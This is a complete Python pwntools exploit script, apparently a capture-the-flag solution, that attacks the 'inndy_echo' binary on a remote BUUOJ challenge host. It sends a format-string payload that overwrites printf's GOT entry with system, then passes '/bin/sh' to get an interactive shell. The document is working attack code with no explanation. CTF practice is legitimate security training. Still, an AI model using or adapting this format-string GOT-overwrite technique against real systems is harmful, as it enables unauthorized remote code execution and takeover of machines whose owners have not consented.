#! /usr/bin/python

from pwn import *
from LibcSearcher import *

#p = process('./inndy_echo')
p = remote('node3.buuoj.cn',25835)
elf = ELF('./inndy_echo')

sl = lambda x : p.sendline(x)
ru = lambda x : p.recvuntil(x)
ia = lambda : p.interactive()
g = lambda : gdb.attach(p,'b *printf')

###format###
fgets_got = elf.got['fgets']
printf_got = elf.got['printf']
system = elf.symbols['system']
success(hex(fgets_got))
success(hex(system))

payload = fmtstr_payload(7,{printf_got:system})
print payload
pause()
sl(payload) 

###get shell###
sl('/bin/sh\x00')
ia()
